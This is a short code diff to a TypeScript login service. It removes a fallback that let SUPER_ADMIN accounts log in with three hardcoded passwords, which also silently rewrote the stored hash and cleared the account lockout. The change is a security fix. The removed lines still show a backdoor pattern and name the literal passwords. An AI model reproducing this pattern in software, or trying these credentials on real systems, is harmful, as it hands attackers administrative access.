@@ -96,29 +96,7 @@ export class AuthService {
       throw new Error(`Account is locked until ${user.lockUntil.toLocaleTimeString()}`);
     }
 
-    let isValid = await bcrypt.compare(passwordString, user.passwordHash);
-
-    // Auto-heal / fallback check for SUPER_ADMIN known administrative passwords
-    if (!isValid && user.role === 'SUPER_ADMIN') {
-      const knownAdminPasswords = ['FramiqAdmin@2026', 'Pratima@2026', 'Pratima@Admin26'];
-      if (knownAdminPasswords.includes(passwordString)) {
-        isValid = true;
-        try {
-          const newHash = await bcrypt.hash(passwordString, 10);
-          await prisma.user.update({
-            where: { id: user.id },
-            data: {
-              passwordHash: newHash,
-              failedLoginAttempts: 0,
-              isLocked: false,
-              lockUntil: null,
-            },
-          });
-        } catch (e) {
-          console.error('[validateCredentials] Failed to auto-heal super admin hash:', e);
-        }
-      }
-    }
+    const isValid = await bcrypt.compare(passwordString, user.passwordHash);
 
     if (!isValid) {
       // Increment failed attempts
